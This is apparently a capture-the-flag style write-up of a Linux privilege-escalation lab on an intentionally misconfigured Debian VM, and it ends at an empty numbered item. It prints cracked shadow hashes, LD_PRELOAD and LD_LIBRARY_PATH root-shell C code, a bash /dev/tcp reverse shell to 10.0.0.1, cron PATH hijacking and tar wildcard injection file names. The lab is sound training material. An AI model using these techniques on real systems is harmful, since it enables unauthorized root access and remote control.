# Linux PrivEsc

## Practice your Linux Privilege Escalation skills on an intentionally misconfigured Debian VM with multiple ways to get root!

1. Typical configuration of /etc/shadow file:
```
$ ls -l /etc/shadow
-rw-r----- 1 root shadow 1395 Nov 17 19:58 /etc/shadow                            
```


/etc/shadow file is readable
```
user@debian:/tmp$ cat /etc/shadow
root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::
daemon:*:17298:0:99999:7:::
bin:*:17298:0:99999:7:::
sys:*:17298:0:99999:7:::
sync:*:17298:0:99999:7:::
games:*:17298:0:99999:7:::
man:*:17298:0:99999:7:::
lp:*:17298:0:99999:7:::
mail:*:17298:0:99999:7:::
news:*:17298:0:99999:7:::
uucp:*:17298:0:99999:7:::
proxy:*:17298:0:99999:7:::
www-data:*:17298:0:99999:7:::
backup:*:17298:0:99999:7:::
list:*:17298:0:99999:7:::
irc:*:17298:0:99999:7:::
gnats:*:17298:0:99999:7:::
nobody:*:17298:0:99999:7:::
libuuid:!:17298:0:99999:7:::
Debian-exim:!:17298:0:99999:7:::
sshd:*:17298:0:99999:7:::
user:$6$M1tQjkeb$M1A/ArH4JeyF1zBJPLQ.TZQR1locUlz0wIZsoY6aDOZRFrYirKDW5IJy32FBGjwYpT2O1zrR2xTROv7wRIkF8.:17298:0:99999:7:::
statd:*:17299:0:99999:7:::
mysql:!:18133:0:99999:7:::
```
```
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt /tmp/hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
password123      (?)     
1g 0:00:00:01 DONE (2022-11-21 12:48) 0.6944g/s 1066p/s 1066c/s 1066C/s cuties..mexico1
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```

2. Historically, the /etc/passwd file contained user password hashes, and some versions of Linux will still allow password hashes to be stored there.

Generate a password hash and write it inside the /etc/passwd root entry:

```
└─$ openssl passwd bellapassword    
$1$GYnznsrb$1nh6QXRI8/xUzuHzWyjUT/
```

![image](https://user-images.githubusercontent.com/62257411/203126354-55067afa-4747-48c0-8478-90fdf6c1fe4b.png)

3. Environmental variables of sudo
LD_PRELOAD
```
user@debian:~$ sudo -l
Matching Defaults entries for user on this host:
    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH

User user may run the following commands on this host:
    (root) NOPASSWD: /usr/sbin/iftop
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/nano
    (root) NOPASSWD: /usr/bin/vim
    (root) NOPASSWD: /usr/bin/man
    (root) NOPASSWD: /usr/bin/awk
    (root) NOPASSWD: /usr/bin/less
    (root) NOPASSWD: /usr/bin/ftp
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/sbin/apache2
    (root) NOPASSWD: /bin/more

```
Compile this C code
```
user@debian:~$ cat /home/user/tools/sudo/preload.c
```
```c
user@debian:~$ cat /home/user/tools/sudo/preload.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
        unsetenv("LD_PRELOAD");
        setresuid(0,0,0); #i want to run the next program as root
        system("/bin/bash -p");
}

```
![image](https://user-images.githubusercontent.com/62257411/203281901-2ee620e3-6340-4fcf-8fd8-25060264e1fc.png)

LD_LIBRARY_PATH
```
user@debian:~$ ldd /usr/sbin/apache2
        linux-vdso.so.1 =>  (0x00007fff1f5ff000)
        libpcre.so.3 => /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007f328420f000)
        libaprutil-1.so.0 => /usr/lib/libaprutil-1.so.0 (0x00007f3283feb000)
        libapr-1.so.0 => /usr/lib/libapr-1.so.0 (0x00007f3283db1000)
        libpthread.so.0 => /lib/libpthread.so.0 (0x00007f3283b95000)
        libc.so.6 => /lib/libc.so.6 (0x00007f3283829000)
        libuuid.so.1 => /lib/libuuid.so.1 (0x00007f3283624000)
        librt.so.1 => /lib/librt.so.1 (0x00007f328341c000)
        libcrypt.so.1 => /lib/libcrypt.so.1 (0x00007f32831e5000)
        libdl.so.2 => /lib/libdl.so.2 (0x00007f3282fe0000)
        libexpat.so.1 => /usr/lib/libexpat.so.1 (0x00007f3282db8000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f32846cc000)

```
Compile this C code
```
user@debian:~$ cat /home/user/tools/sudo/library_path.c

```
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```
![image](https://user-images.githubusercontent.com/62257411/203288830-6c1c2411-c258-481c-bcba-187429c74547.png)

4. Cron job
```
user@debian:~$ cat /etc/crontab 
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * root overwrite.sh #run every minute
* * * * * root /usr/local/bin/compress.sh ##run every minute
```

Add to overwrite.sh the following reverse shell:
bash -i >& /dev/tcp/10.0.0.1/4242 0>&1

5. Cron Job - PATH environment variable
```
user@debian:~$ cat /etc/crontab 
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin # <------- EXPLOIT THIS CONFIGURATION ERROR

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * root overwrite.sh # ---> IT ISN'T SPECIFIED THE COMPLETE PATH TO BINARY !!!!
* * * * * root /usr/local/bin/compress.sh ##run every minute
```
Create a file in /home/user/overwrite.sh
![image](https://user-images.githubusercontent.com/62257411/203292503-cd592735-73be-4176-948c-35ae5c518777.png)

Make sure that the file is executable:
```bash
chmod +x /home/user/overwrite.sh
```
6.Cron Jobs - Wildcards 
```bash
user@debian:~$ cat /usr/local/bin/compress.sh 
#!/bin/sh
cd /home/user
tar czf /tmp/backup.tar.gz *
```
If we create 2 files under /home/user with these names:
```
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=shell.elf
```
![image](https://user-images.githubusercontent.com/62257411/203304264-03475dd1-8606-4734-a0de-d421a24d1d5a.png)



When the tar command in the cron job runs, the wildcard (*) will expand to include these files. Since their filenames are valid 
tar command line options, tar will recognize them as such and treat them as command line options rather than filenames.

```bash
tar czf /tmp/backup.tar.gz *
```

will be expanded as here:
```bash
tar czf /tmp/backup.tar.gz --checkpoint=1 <<<<<<< treat it as command line options rather than filenames!!!
tar czf /tmp/backup.tar.gz --checkpoint-action=exec=shell.elf <<<<<<< treat it as command line options rather than filenames!!!
tar czf /tmp/backup.tar.gz myvpn.ovpn
tar czf /tmp/backup.tar.gz tools
```
and thanks to misconfiguration of PATH variable in /etc/crontab
![image](https://user-images.githubusercontent.com/62257411/203304810-8696d96f-8bbc-4b46-b9b6-d9ed4354923a.png)

we can obtain a reverse shell!

7. 
